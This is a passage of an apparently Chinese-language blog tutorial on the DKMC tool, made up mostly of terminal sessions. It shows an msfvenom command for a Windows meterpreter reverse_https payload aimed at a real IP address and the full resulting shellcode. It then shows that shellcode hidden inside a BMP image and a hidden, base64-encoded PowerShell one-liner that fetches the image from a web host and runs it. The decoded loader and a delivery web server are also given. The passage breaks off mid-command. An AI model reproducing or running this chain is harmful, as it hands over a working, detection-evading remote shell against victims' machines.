<ul>
<li>Generate PowerShell payload to execute on the victim system.</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ps</span><br><span class="line">(powershell)&gt;&gt;&gt; <span class="built_in">set</span> url http://127.0.0.1:8080/output-1496175261.bmp</span><br><span class="line">        [+] url value is <span class="built_in">set</span>.</span><br><span class="line"></span><br><span class="line">(powershell)&gt;&gt;&gt; run</span><br><span class="line">        [+] Powershell script:</span><br><span class="line">powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBDAEYAVABUAEwAVgBrAEMALwB6AEUAMABPAFQAWQB4AE4AegBVADAATgBEAFEAdQBNAGoAVQAhAHQAVgBaAHIAYgA5AHAASQBGAFAAMABlAEsAZgA5AGgAVgBDAEgAWgBsAG8AdwBMAFMAYgBmAE4AUgBxAHAAVQBuAG4AbQAwAEUASQBKAEoAMABvAFMAaQBhAHIAIQB2AE0ARwBIAHMATQBUAE4AagBFAHIAZgBOAGYAOQA5AHIAWQB6AGQARQBrAEcAeAAyAHQAVwBzACsAWQBIAHYAdQAzAEwAbAB6AHoAcgBuAEgANAA0AEkAdQB1ADEAbwB5AFQAMwBlAEUARAA2AFIAOABDAFYASQB4AEUAWgBLADkAMwBaADMAZABuAFoASwAvAGIASAA4AEYANQBRAHMALwBjAFAAWABGAFAASQBDADcAZQBmACsAbwBkADAANAArAGsAawAvAEcANwBzADQAawBEAGoAMgBkAHgAbAA3ADIANQB2AGYAWAB2AFQAYgA1AHUAYgB0AEQAOABxAHQASABKAFEAMgBJAFcAVgBwAFMAKwBUADAAUQBmAHMAegBCAEoAdABsAEQASgBJAFUASABmAGkAegBCAGUAZwB3AHUATABTADQARwA3AGMAKwBZADEAUgB6AFcAbwBxAGcAcAAhAHMAcgBDADAAZQBGAGgASQA1AFkAUwBRAHIAMQA2AGQAbwA1ACEAMQA1AFMAQwBZAE0AdwBaAEsATgBNAGkAdgA4AGoAVgBEAEMAUwBVAHoAOABhADMANABHAG4AeQBrADUAUwArAE8AMABkAGMAagBDAG4AUAB3ADUASQBHADkAVwBhADQAbwAxAHIAbwBwADIATgBmAGgARQBmAFQAYQBoADAAMwA0AGsAeQBiAHgAcgBkAHYAaABqAFUAcwBWADAAZABPAGEAeABGAFQAcgBrAHoARABUAFoAUwBHAHcAUABFADUATgB5AHoAeQBZAEsAVQBMAEQAcABJAEkAVABLAFAARABQAEMAbQBVAG0ARwBqAG4AaQBvAFgANwBlADgANQBGAHEATwBnAEUAdQBwAGgAdABDAFIAMwBRAE0AKwBFAHIAdwAwAHIAaABLAHYAWQBqAFEAYwBjAHkAegBMAGUAVgA1AGwAbABGAG0AUQBiAGUAOQBuAEQALwBOAGQAKwBYAG8ASABDAFMAYwB4AEkAdQB4AFIAegBNAFUAaABoAHoAYgBwAE4AUAA1AGoAIQB2AG8AaAArAEgAbQBnAFcAIQA0AHgAcQBrAGkARgB5AFEAUwArAGEAQgBjAG8ANQBwADYASABQAG8AdwAyAFIAawBkAHUARwB1ADIAUAB0AHIASgA1AG4AcgBrAHoAQwBxAHAANgBWAGwASQAwAG4AYgA2AHUAeABrAHAASwAyAG0ARwB0AFoAbQBwAFcAdgBNAFcAbgBoAHQAcwBJAHUAIQBQAEsAUwBZAC8AQgBiAEoAZgBMAEgAbwBSAC8AVwBsAFkAdQBGAFIAdQBFAFUAcABqAHkAKwBLAGEANQBpAE4AIQBPADcARgA3ACEAbgBGAHMAaQBRAGYAUwBjAFUAbQBIAFMAeQBLAGEAaQBFAFQAZgBDAHcATgBaACEAegBXAGkAIQB4AFQAcQBvAGEAagBFAFMAbABCAGYAQwA0AG4AOAA2AGIAbwBkADQASwBwAGwAOQBSAG8AYgBMADgAMgBkAGIAWABJAGcAMQBuAEcANAArAG4AMAA3AFAAagBIAFkARABZAE4ARgBxADAAegBIAEIAeABlAEMAdQBhAFAASABsAE0AOQBJAGIAegBVAHYAagBtACsAZwBMAG8ATwB1AEMALwBiAFgAWAA0ADAAVABpAGMAOABMACsAVQBtAFQARgBnAEkAegBTAFMAawAhAGYATQBLAHQAWgByAGIARwBJAFUASgBoAHcAdwArAHAAdwBqAHIAWQB0ADIAbQBrAFEAKwAhADMAdwBRAE8AVQA2AHAAVABpAG0AdwB5ADMASgB6AFcAQwBwAGoAKwBQAGIAYwBlAE0AKwA2AEQAcgBIAG0AbwBDAG8AVgBWAG8AVwBDAHMAcAA4AFcAcwBXAEQAZQBOAGsANwAhAEQAIQBTAEsAOABlAGoAYQBRADMAUQBuADIAQwBCAFQAUgBlAFYAOABrAHgAZQByAHAATQB3AFkAWgBEAFUANgBWAHMAawBrAHYAeABpAGIAMQBiAE8ASQBDADUAZQBEAGIAcABCAFkAcQBsAGcALwBWAFkAaQAyAHkAVwArAE8AeAAzAEUANwBNAE4AZgBPAG8AMABrAFcANgBrAGYAVQBDAHQASABrAEoARABSAEUAcQBMAFcATQBQAGQAWQBCAHcARABOAHcASQBQAEUAWgA1AGkAbwA1AE4AagBwAGsAUAA5AGMAUgBsADAANgBJAFUAWQB5AHMAMgBEAGMAbwA1AEMANgBlAFkAYQBZAG4AYwA0AEoAcwBVAEUAMQBlAG4ANgBwAEoAWQA5AGEAYQBTAEwATQBjAEYAZgBSAEoARQBIACEASwBjAGsATABsAEoAbQA5AE0AcABlAGsAZgBlAGUAcABrADIANgBSAFIAOAA0AHgAVQA3AEsASgBwAHQAMQBWAGsAcABmACEAVgB1AGEALwBXAGoASgBsAHcAdQB0AEUAMAB1AG0AZABUAG8AVQB5AGsAVgBUADcAWAA1ADMAeABWAGEAMgBOAFoARwB2AFEAMABKAE8AYwBsAG0AMABkAGIARABlAHEATABUAGYAaQB2AEYAQwBYAEIAKwBmAG4AWQBSAFgAWQBlADMAbAAxAGUAZABtADMANgBYAHoAZwBhADMAawBVADcAZABmAEYAUABRAFgAVQAhAFQAaABYAEUARABQAFQAegBVAHEAQwBaAHgARgAzAEoAQgAvAFMAYgBWADEASAB3AHoAMAB6AG8ANgBmAFAAdQAyAHUAdgBmAEIAcQBlAEMAdgBlAG4AaABRAE8AYQBpADgARgBiAEcATwBZAGwAMgB1AHYAdgB2AHoAZgBmAFgARABIADMAdgB2AHEAOAA0ADQAaQBOADUAawA3AFYAZgA2ACsAaQBOAGEAcQBMADUAcQBpAGQAbABpAGUAagBvAC8AdgBiADYAZQB6AEQANgBQAGsANQBPAGIAdABQADMAKwB4AGgAUQA3AFYASwBvAFoANQBjAGcANABtAGwAMABoAHYATABhAFEANwBkAHkAdgBlAG8ASwBsAE0AMAB5AHoAKwBMAGoATgBRAFkAYgAhADAAZgA3AHgAIQAxAEcAdwBVAGUATgBjAGUASwBtAEYAUABqAEUAMwB0AFAARwBWAHUAWQA1AFEAZABoAGQANAB1ADcAKwAzADkAYwA0AGkAdgB3AE8AdABSADQAYwB0AFgAaAAwAGUAMwBtAEQAQgB5AE8ANQB6AEMARAB0AGYASQBKAHoAcQBtAFYAMgA1ADMANgA5AFUAMABCAFkAcgA5ACsAOABxAEMATQB2AHIATgA5ADQAUQBVAFcASQArAG0AOQA1AE8AcgBmAFoAWgBoAEYAKwBxAGkAMgBkADEAcgBSAGgAYQAwAHYANQA5ADcAZQBZADYAawBkAEQAcwA5AGkANAA3AHIAVgBiAGMAOQBPAGIALwBPAHoAMgA1AFkARwBmADQANQA3ACsAVwBuAHMAZAAzAEwANAB5ACsAaQByAEsASwAvAFQAeABzAEcANgBGAFAAWAAvAHcAagAvAHYANABOAE0AbABlAFUAYQBRAHgAMgAwAGYAYwA0AHIASAByAHoAWgBZAEIAeQBxAGEANgBkACEATABaAFMAaQBpAHEAYwA1AEYAZAA2AE4ARAB2AEQAagB1ADMAaQBTAFcARgAzAHgALwBpAFUANgB1AEIAawBRAHQAWgBRAFUAdQB3AEgAbgBzAHQAZwBRAFEANgBzADkAWgBPACEAMABsAFQAcQA4AHEAMABZADQAMgBFAHUAUwBqAC8AUQB1AEYAWQByADYAcAArADEANQAwAGUAdAB3AFQASwB1ADkAOAArAEQAZgBxAHQAdQBrAFoAUABXAFYANwBKAHQAaABEAHkAUQBNAHEASgBXAFUALwB0ADcAZQBPAHEAVAAwAHoAZwAxAFAALwBMAGMARwBmAFkAWAB1AFUATQBzAHMAdQBWACsAawBUADUANABnAEsAZQA1ADgAcQBrAFkAWgB3AFkASAArAEwARgBiAEwAeQAxAGIAYwBuAHMAaQBqAFAAOABMAHAAegBWADkAdABFAFEATAAhACEAIQA9ACIALgBSAGUAcABsAGEAYwBlACgAIgAhACIALAAgACIAQQAiACkAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA</span><br><span class="line"></span><br><span class="line">(powershell)&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>base64decode:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span>=New-Object IO.MemoryStream(,[Convert]::FromBase64String(<span class="string">&quot;H4sICFTTLVkC/zE0OTYxNzU0NDQuMjU!tVZrb9pIFP0eKf9hVCHZlowLSbfNRqpUnnm0EIJJ0oSiar!vMGHsMTNjErfNf99rYzdEkGx2tWs+YHvu3LlzzrnH44Iuu1oyT3eED6R8CVIxEZK93Z3dnZK/bH8F5Qs/cPXFPIC7ef+od04+kk/G7s4kDj2dxl725vfXvTb5ubtD8qtHJQ2IWVpS+T0QfszBJtlDJIUHfizBegwuLS4G7c+Y1RzWoqgp!srC0eFhI5YSQr16do5!15SCYMwZKNMiv8jVDCSUz8a34Gnyk5S+O0dcjCnPw5IG9Wa4o1rop2NfhEfTah034kybxrdvhjUsV0dOaxFTrkzDTZSGwPE5NyzyYKULDpIITKPDPCmUmGjnioX7e85FqOgEuphtCR3QM+Erw0rhKvYjQccyzLeV5llFmQbe9nD/Nd+XoHCScxIuxRzMUhhzbpNP5j!voh+HmgW!4xqkiFyQS+aBco5p6HPow2RkduGu2PtrJ5nrkzCqp6VlI0nb6uxkpK2mGtZmpWvMWnhtsIu!PKSY/BbJfLHoR/WlYuFRuEUpjy+Ka5iN!O7F7!nFsiQfScUmHSyKaiETfCwNZ!zWi!xTqoajESlBfC4n86bod4Kpl9RobL82dbXIg1nG4+n07PjHYDYNFq0zHBxeCuaPHlM9IbzUvjm+gLoOuC/bXX40Tic8L+UmTFgIzSSk!fMKtZrbGIUJhww+pwjrYt2mkQ+!3wQOU6pTimwy3JzWCpj+PbceM+6DrHmoCoVVoWCsp8WsWDeNk7!D!SK8ejaQ3Qn2CBTReV8kxerpMwYZDU6Vskkvxib1bOIC5eDbpBYqlg/VYi2yW+Ox3E7MNfOo0kW6kfUCtHkJDREqLWMPdYBwDNwIPEZ5io5NjpkP9cRl06IUYys2Dco5C6eYaYnc4JsUE1en6pJY9aaSLMcFfRJEH!KckLlJm9Mpekfeepk26RR84xU7KJpt1Vkpf!Vua/WjJlwutE0umdToUykVT7X53xVa2NZGvQ0JOclm0dbDeqLTfivFCXB+fnYRXYe3l1edm36Xzga3kU7dfFPQXU!ThXEDPTzUqCZxF3JB/SbV1Hwz0zo6fPu2uvfBqeCvenhQOai8FbGOYl2uvvvzffXDH3vvq844iN5k7Vf6+iNaqL5qidliejo/vb6ezD6Pk5ObtP3+xhQ7VKoZ5cg4ml0hvLaQ7dyveoKlM0yz+LjNQYb!0f7x!1GwUeNceKmFPjE3tPGVuY5Qdhd4u7+39c4ivwOtR4ctXh0e3mDByO5zCDtfIJzqmV25369U0BYr9+8qCMvrN94QUWI+m95OrfZZhF+qi2d1rRha0v597eY6kdDs9i47rVbc9Ob/Oz25YGf457+Wnsd3L4y+irKK/TxsG6FPX/wj/v4NMleUaQx20fc4rHrzZYByqa6d!LZSiiqc5Fd6NDvDju3iSWF3x/iU6uBkQtZQUuwHnstgQQ6s9ZO!0lTq8q0Y42EuSj/QuFYr6p+150etwTKu98+DfqtukZPWV7JthDyQMqJWU/t7eOqT0zg1P/LcGfYXuUMssuV+kT54gKe58qkYZwYH+LFbLy1bcnsijP8LpzV9tEQL!!!=&quot;</span>.Replace(<span class="string">&quot;!&quot;</span>, <span class="string">&quot;A&quot;</span>)));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream(<span class="variable">$s</span>,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();</span><br></pre></td></tr></table></figure>

<ul>
<li>Built-in Web Server to deliver the image</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; web </span><br><span class="line">(web)&gt;&gt;&gt; <span class="built_in">set</span> port 8080</span><br><span class="line">        [+] port value is <span class="built_in">set</span>.</span><br><span class="line"></span><br><span class="line">(web)&gt;&gt;&gt; run</span><br><span class="line">        [+] Starting web server on port 8080</span><br><span class="line"></span><br><span class="line">127.0.0.1 - - [30/May/2017 16:18:43] <span class="string">&quot;GET /output-1496175261.bmp HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>详细使用：</p>
<p>msf生成raw格式的shellcode</p>
<p>1、先利用msf生成raw文件<br>2、利用sc讲raw文件转换为shellcode<br>3、利用gen将上一步的shellcode注入到一个BMP图像<br>4、利用ps生成基于powershell的BMP文件的payload<br>5、利用web提供的简单web服务进行分发BMP文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=45.32.137.154 LPORT=5566 -e x86/shikata_ga_nai -b <span class="string">&quot;\x00&quot;</span> -i 5 -a x86 -f raw -o dkmctest.raw</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">选择sc</span><br><span class="line"></span><br><span class="line">(shellcode)&gt;&gt;&gt; <span class="built_in">set</span> <span class="built_in">source</span> /root/test/dkmctest.raw</span><br><span class="line"></span><br><span class="line">(shellcode)&gt;&gt;&gt; run</span><br><span class="line">        [+] Shellcode:</span><br><span class="line">\xdd\xc4\xbb\xa5\x58\x6d\x99\xd9\x74\x24\xf4\x58\x29\xc9\xb1\xba\x83\xe8\xfc\x31\x58\x14\x03\x58\xb1\xba\x98\x24\x87\x82\xb2\x82\x2d\x3e\xed\x59\xf5\x4b\x55\x8b\x3c\x02\xd9\xfa\xd5\x71\x1d\x96\x3d\xf9\xe2\x6c\xe1\xb0\x8a\xf5\xab\x01\x52\xfe\xaa\xde\x02\x27\x5d\xd7\x0c\x3f\x55\x7c\xa8\x50\x5a\xf4\xca\x20\x18\x67\x42\x5a\x1b\xb2\x0f\x29\x1a\x08\xc5\x9d\x4c\x94\xa5\x5e\x3b\x41\x83\xac\x6f\x4c\x1e\x37\xcd\xe1\xfe\xa7\xc6\x78\x16\x0d\xef\xeb\x43\xd9\x37\x8c\xdd\x49\x37\x2f\xdb\x22\x19\x95\x6d\x06\x76\xf9\x23\x50\xdb\x1b\xbd\x90\x57\x47\xc7\xe0\x09\x59\x31\xe3\xd4\xa2\x7b\x3a\xe2\x38\x0a\x91\xb6\xd2\x22\x5f\xa6\xaa\x5e\xfa\x2c\xc3\xf0\x65\x6b\x8c\x59\x13\x04\xce\x19\xea\xae\xc8\xdc\x87\x5b\x83\xfe\x8b\x1d\x99\xae\xd0\xdd\x29\xef\x40\xc4\x34\x01\xb6\x4f\xdf\x51\xf0\x9f\xb5\x0e\x01\x3e\x53\xb0\xe6\x24\x7b\xd4\xcf\x62\x86\xe8\x7c\x54\xcf\xd0\x8f\xbc\x70\xef\xd9\x0b\xb3\x9f\x85\xc1\x3e\x33\xca\x84\xeb\xfa\x55\x05\xfe\x1b\x58\x9a\x0f\xbb\xdc\xdf\x44\xec\x1f\x18\x46\xcd\xd3\x6d\xa5\xc1\x18\x66\x14\xc7\xea\x4a\x9e\x59\x87\x90\xf6\x30\xee\xa3\x0b\x8c\x04\xd9\x03\x6e\xb5\x59\x99\x1b\xdb\xa1\x90\x20\x8c\x3e\x69\xb7\x78\xee\xb8\xb9\x8f\x22\x97\xf5\x07\x37\xca\xb2\x11\xcb\x69\x95\xa6\xd6\x94\x10\x5c\x8e\xaf\xb3\x92\xad\x5b\xc0\x58\xd4\xf0\xdf\xc0\x03\x41\x99\x78\xfc\x4b\x79\xeb\x8c\x8d\x51\x89\x43\x27\xd6\x08\x4f\xb5\x68\x09\xf2\x1a\xd4\xd3\xcc\xfe\xc7\x5d\x75\xdb\xfc\x21\xab\x1f\x4e\xa4\x5b\xfe\x19\x63\x29\x1d\xb7\x8d\x15\x4b\x8e\xbf\xe0\xa1\xfd\xec\x8e\xc3\x43\x90\xf3\x28\x4e\x31\x1e\xfc\x0f\xba\x02\x27\xa3\x29\x7c\xc5\x69\x0e\xe2\x5d\x48\xd3\xd0\xe3\x77\x37\x16\x5d\xcd\x64\x49\x7d\x46\xaa\xcd\xe3\xdb\xa3\x55\xf1\x3b\x45\xcb\xe9\x89\xfa\x09\x6a\xaf\x05\x45\xa5\x8f\x2d\xfb\x88\x0d\x4e\x8e\x59\xdc\xd6\x25\xd9\x6d\x68\xc8\xe6\x79\x14\x8f\x46\x0f\x12\x2e\xa9\xfc\x14\x21\x0e\xdc\x9a\x19\x14\xe7\xe3\xe6\xc7\x42\xa8\xf3\xf1\x8a\x40\xf6\xd2\x78\x5d\xb2\xe5\xaf\x12\x56\xc9\x40\x11\x74\x4b\xc2\x12\x7e\xd4\xde\x8d\x4a\x6f\xc5\x7c\x93\x7b\x4f\x98\xbc\x18\x78\xfa\x7d\x92\x7c\x1c\x7d\x7f\xf8\x21\x79\xe0\xb8\xf9\x6a\x86\xe0\xcd\x09\xdc\xb5\xe9\xde\x52\x51\xcd\xfe\xbf\x19\xab\x76\x84\xc4\x42\x31\x76\x7b\x29\x7b\x2d\x34\x82\x1f\x0c\xa5\x1c\xa9\xcf\x54\x5a\x3b\x1a\xe2\xd5\x9a\x1e\xe2\x7b\xa3\x39\x64\xff\x78\xc2\x72\x88\x70\xc6\x06\xcd\xa8\xbc\x25\xfe\x56\x81\x75\x05\x8b\x8a\x6f\x16\xe2\xd6\x86\xdb\xf6\x1d\xa0\x31\x25\x55\x66\x25\x87\xa1\xb9\x96\x70\x87\x19\xcb\x69\xf6\x2f\xad\xaa\x4e\x86\x08\x40\xe3\xd8\xc4\x6f\x06\xa0\x01\x16\xfd\x26\x32\x2e\x99\xc2\x9a\xea\x11\x9a\x27\x9d\xea\x9a\x48\x60\x2a\x8a\x82\x3e\xe5\xcd\x93\x2c\x78\x01\x06\x29\x64\x5c\xda\x0c\xea\xd3\xca\xde\x84\xd1\xe1\xd9\x5b\xc3\xf2\x3c\x9a\x7d\x02\x65\xc9\x54\xe5\xbc\x46\x9b\x64\xe3\xd1\x94\x64\xf6\xcf\xf9\xec\x26\xec\xa2\x08\xfe\x2b\x6b\xe6\x87\xc2\xca\xed\x4e\xf0\x17\xf1\xc0\xa6\xea\x95\x1e\xd6\x2f\xce\x9a\x75\x8a\x4b\xb8\x2c\xa3\xec\x13\x68\x2f\xe3\x66\x06\x28\x6b\xdc\x91\x3f\xc7\xbe\x41\xd0\x95\x9a\xae\xd2\x8d\x9a\x9d\xa5\x76\x1d\x37\x69\x29\xa6\x43\x8e\xc8\xc0\xe8\x93\xc2\x51\xec\x62\x8e\x74\xbe\xfe\x2e\xc5\xf2\x4b\xd7\xb2\xdd\xc9\xd1\x07\x34\x05\x8d\x13\x24\x3f\x49\xee\xb0\x78\x5e</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gen</span><br><span class="line"></span><br><span class="line">(generate)&gt;&gt;&gt; <span class="built_in">set</span> shellcode \xdd\xc4\xbb\xa5\x58\x6d\x99\xd9\x74\x24\xf4\x58\x29\xc9\xb1\xba\x83\xe8\xfc\x31\x58\x14\x03\x58\xb1\xba\x98\x24\x87\x82\xb2\x82\x2d\x3e\xed\x59\xf5\x4b\x55\x8b\x3c\x02\xd9\xfa\xd5\x71\x1d\x96\x3d\xf9\xe2\x6c\xe1\xb0\x8a\xf5\xab\x01\x52\xfe\xaa\xde\x02\x27\x5d\xd7\x0c\x3f\x55\x7c\xa8\x50\x5a\xf4\xca\x20\x18\x67\x42\x5a\x1b\xb2\x0f\x29\x1a\x08\xc5\x9d\x4c\x94\xa5\x5e\x3b\x41\x83\xac\x6f\x4c\x1e\x37\xcd\xe1\xfe\xa7\xc6\x78\x16\x0d\xef\xeb\x43\xd9\x37\x8c\xdd\x49\x37\x2f\xdb\x22\x19\x95\x6d\x06\x76\xf9\x23\x50\xdb\x1b\xbd\x90\x57\x47\xc7\xe0\x09\x59\x31\xe3\xd4\xa2\x7b\x3a\xe2\x38\x0a\x91\xb6\xd2\x22\x5f\xa6\xaa\x5e\xfa\x2c\xc3\xf0\x65\x6b\x8c\x59\x13\x04\xce\x19\xea\xae\xc8\xdc\x87\x5b\x83\xfe\x8b\x1d\x99\xae\xd0\xdd\x29\xef\x40\xc4\x34\x01\xb6\x4f\xdf\x51\xf0\x9f\xb5\x0e\x01\x3e\x53\xb0\xe6\x24\x7b\xd4\xcf\x62\x86\xe8\x7c\x54\xcf\xd0\x8f\xbc\x70\xef\xd9\x0b\xb3\x9f\x85\xc1\x3e\x33\xca\x84\xeb\xfa\x55\x05\xfe\x1b\x58\x9a\x0f\xbb\xdc\xdf\x44\xec\x1f\x18\x46\xcd\xd3\x6d\xa5\xc1\x18\x66\x14\xc7\xea\x4a\x9e\x59\x87\x90\xf6\x30\xee\xa3\x0b\x8c\x04\xd9\x03\x6e\xb5\x59\x99\x1b\xdb\xa1\x90\x20\x8c\x3e\x69\xb7\x78\xee\xb8\xb9\x8f\x22\x97\xf5\x07\x37\xca\xb2\x11\xcb\x69\x95\xa6\xd6\x94\x10\x5c\x8e\xaf\xb3\x92\xad\x5b\xc0\x58\xd4\xf0\xdf\xc0\x03\x41\x99\x78\xfc\x4b\x79\xeb\x8c\x8d\x51\x89\x43\x27\xd6\x08\x4f\xb5\x68\x09\xf2\x1a\xd4\xd3\xcc\xfe\xc7\x5d\x75\xdb\xfc\x21\xab\x1f\x4e\xa4\x5b\xfe\x19\x63\x29\x1d\xb7\x8d\x15\x4b\x8e\xbf\xe0\xa1\xfd\xec\x8e\xc3\x43\x90\xf3\x28\x4e\x31\x1e\xfc\x0f\xba\x02\x27\xa3\x29\x7c\xc5\x69\x0e\xe2\x5d\x48\xd3\xd0\xe3\x77\x37\x16\x5d\xcd\x64\x49\x7d\x46\xaa\xcd\xe3\xdb\xa3\x55\xf1\x3b\x45\xcb\xe9\x89\xfa\x09\x6a\xaf\x05\x45\xa5\x8f\x2d\xfb\x88\x0d\x4e\x8e\x59\xdc\xd6\x25\xd9\x6d\x68\xc8\xe6\x79\x14\x8f\x46\x0f\x12\x2e\xa9\xfc\x14\x21\x0e\xdc\x9a\x19\x14\xe7\xe3\xe6\xc7\x42\xa8\xf3\xf1\x8a\x40\xf6\xd2\x78\x5d\xb2\xe5\xaf\x12\x56\xc9\x40\x11\x74\x4b\xc2\x12\x7e\xd4\xde\x8d\x4a\x6f\xc5\x7c\x93\x7b\x4f\x98\xbc\x18\x78\xfa\x7d\x92\x7c\x1c\x7d\x7f\xf8\x21\x79\xe0\xb8\xf9\x6a\x86\xe0\xcd\x09\xdc\xb5\xe9\xde\x52\x51\xcd\xfe\xbf\x19\xab\x76\x84\xc4\x42\x31\x76\x7b\x29\x7b\x2d\x34\x82\x1f\x0c\xa5\x1c\xa9\xcf\x54\x5a\x3b\x1a\xe2\xd5\x9a\x1e\xe2\x7b\xa3\x39\x64\xff\x78\xc2\x72\x88\x70\xc6\x06\xcd\xa8\xbc\x25\xfe\x56\x81\x75\x05\x8b\x8a\x6f\x16\xe2\xd6\x86\xdb\xf6\x1d\xa0\x31\x25\x55\x66\x25\x87\xa1\xb9\x96\x70\x87\x19\xcb\x69\xf6\x2f\xad\xaa\x4e\x86\x08\x40\xe3\xd8\xc4\x6f\x06\xa0\x01\x16\xfd\x26\x32\x2e\x99\xc2\x9a\xea\x11\x9a\x27\x9d\xea\x9a\x48\x60\x2a\x8a\x82\x3e\xe5\xcd\x93\x2c\x78\x01\x06\x29\x64\x5c\xda\x0c\xea\xd3\xca\xde\x84\xd1\xe1\xd9\x5b\xc3\xf2\x3c\x9a\x7d\x02\x65\xc9\x54\xe5\xbc\x46\x9b\x64\xe3\xd1\x94\x64\xf6\xcf\xf9\xec\x26\xec\xa2\x08\xfe\x2b\x6b\xe6\x87\xc2\xca\xed\x4e\xf0\x17\xf1\xc0\xa6\xea\x95\x1e\xd6\x2f\xce\x9a\x75\x8a\x4b\xb8\x2c\xa3\xec\x13\x68\x2f\xe3\x66\x06\x28\x6b\xdc\x91\x3f\xc7\xbe\x41\xd0\x95\x9a\xae\xd2\x8d\x9a\x9d\xa5\x76\x1d\x37\x69\x29\xa6\x43\x8e\xc8\xc0\xe8\x93\xc2\x51\xec\x62\x8e\x74\xbe\xfe\x2e\xc5\xf2\x4b\xd7\xb2\xdd\xc9\xd1\x07\x34\x05\x8d\x13\x24\x3f\x49\xee\xb0\x78\x5e</span><br><span class="line">        [+] shellcode value is <span class="built_in">set</span>.</span><br><span class="line"></span><br><span class="line">(generate)&gt;&gt;&gt; run</span><br><span class="line">        [+] Image size is 300 x 275</span><br><span class="line">        [+] Generating obfuscation key 0x345c8c05</span><br><span class="line">        [+] Shellcode size 0x300 (768) bytes</span><br><span class="line">        [+] Generating magic bytes 0x8402012f</span><br><span class="line">        [+] Final shellcode length is 0x353 (851) bytes</span><br><span class="line">        [+] New BMP header <span class="built_in">set</span> to 0x424de9a8c30300</span><br><span class="line">        [+] New height is 0x0e010000 (270)</span><br><span class="line">        [+] Successfully save the image. (/root/DKMC/output/output-1599057844.bmp)</span><br></pre></td></tr></table></figure>

<p>图片生成了，拷出来放到vps上面，然后exit回退</p>
<p>地址： <span class="exturl" data-url="aHR0cDovL3d3dy5sdWNpZmVyMTEueHl6L2V2aWwxMS5ibXA=">http://www.lucifer11.xyz/evil11.bmp<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line"></span><br><span class="line">(powershell)&gt;&gt;&gt; <span class="built_in">set</span> url http://www.lucifer11.xyz/evil11.bmp</span><br><span class="line">        [+] url value is <span class="built_in">set</span>.</span><br><span class="line"></span><br><span class="line">(powershell)&gt;&gt;&gt; run</span><br><span class="line">        [+] Powershell script:</span><br><span class="line">powershell.exe -nop -w hidden -enc 